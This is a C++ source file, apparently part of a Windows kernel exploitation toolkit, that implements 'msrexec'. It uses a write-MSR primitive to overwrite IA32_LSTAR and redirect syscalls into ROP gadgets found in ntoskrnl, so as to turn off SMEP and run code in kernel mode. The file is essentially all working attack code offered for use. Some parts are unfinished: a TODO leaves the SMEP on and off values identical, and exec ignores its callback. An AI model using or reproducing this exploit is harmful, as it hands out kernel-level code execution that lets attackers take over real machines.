#include "msrexec.hpp"

namespace vdm
{
	msrexec_ctx::msrexec_ctx(writemsr_t wrmsr)
		: wrmsr(wrmsr)
	{
		if (!m_mov_cr4_gadget)
			m_mov_cr4_gadget = 
				utils::rop::find_kgadget(
					MOV_CR4_GADGET, "xxxx");

		if (!m_sysret_gadget)
			m_sysret_gadget = 
				utils::rop::find_kgadget(
					SYSRET_GADGET, "xx");

		if (!m_pop_rcx_gadget)
			m_pop_rcx_gadget =
				utils::rop::find_kgadget(
					POP_RCX_GADGET, "xx") + 2;

		if (m_kpcr_rsp_offset && m_kpcr_krsp_offset)
			return;

		m_smep_off = 0x6F8; // TODO construct cr4 value...
		m_smep_on = 0x6F8;
		const auto [section_data, section_rva] = 
			utils::pe::get_section(
				reinterpret_cast<std::uintptr_t>(
					LoadLibraryA("ntoskrnl.exe")), ".text");

		const auto ki_system_call =
			utils::scan(reinterpret_cast<std::uintptr_t>(
				section_data.data()), section_data.size(), 
					KI_SYSCALL_SIG, KI_SYSCALL_MASK);

		m_system_call = (ki_system_call - 
			reinterpret_cast<std::uintptr_t>(
				section_data.data())) + section_rva + 
					utils::kmodule::get_base("ntoskrnl.exe");

		/*
			.text:0000000140406CC0								KiSystemCall64
			.text:0000000140406CC0 0F 01 F8                     swapgs
			.text:0000000140406CC3 65 48 89 24 25 10 00 00 00   mov     gs:10h, rsp <====== + 8 bytes for gs offset...
			.text:0000000140406CCC 65 48 8B 24 25 A8 01 00 00   mov     rsp, gs:1A8h <======= + 17 bytes for gs offset...
		*/

		m_kpcr_rsp_offset = *reinterpret_cast<std::uint32_t*>(ki_system_call + 8);
		m_kpcr_krsp_offset = *reinterpret_cast<std::uint32_t*>(ki_system_call + 17);

		std::printf("> m_pop_rcx_gadget -> 0x%p\n", m_pop_rcx_gadget);
		std::printf("> m_mov_cr4_gadget -> 0x%p\n", m_mov_cr4_gadget);
		std::printf("> m_sysret_gadget -> 0x%p\n", m_sysret_gadget);
		std::printf("> m_kpcr_rsp_offset -> 0x%x\n", m_kpcr_rsp_offset);
		std::printf("> m_kpcr_krsp_offset -> 0x%x\n", m_kpcr_krsp_offset);
		std::printf("> m_system_call -> 0x%p\n", m_system_call);
		std::getchar();
	}

	void msrexec_ctx::exec(callback_t kernel_callback)
	{
		wrmsr(IA32_LSTAR_MSR, m_pop_rcx_gadget);
		syscall_wrapper();
	}
}